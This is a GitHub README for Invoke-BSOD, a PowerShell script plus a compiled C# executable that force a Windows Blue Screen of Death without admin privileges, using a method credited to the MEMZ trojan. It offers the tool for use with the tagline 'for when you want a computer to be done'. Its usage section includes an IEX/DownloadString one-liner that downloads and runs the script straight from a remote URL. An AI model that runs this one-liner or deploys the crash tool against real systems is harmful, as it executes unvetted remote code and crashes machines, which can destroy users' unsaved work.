# Invoke-BSOD
For when you want a computer to be done - without admin!

BSOD method from here: https://github.com/Leurak/MEMZ/blob/master/WindowsTrojan/Source/Destructive/KillWindows.c#L10-L18

### Invoke-BSOD.ps1

A PowerShell script to induce a Blue Screen of Death (BSOD) without admin privileges.

This is a standalone script, **it does not depend on any other files here.**

Usage:
```
PS>Import-Module .\Invoke-BSOD.ps1
PS>Invoke-BSOD
```
OR...
```
PS>IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD
```
### BSOD.exe

A compiled executable that also create a Blue Screen of Death.

Useful when you don't have PowerShell?

### Program.cs

The C# source behind BSOD.exe
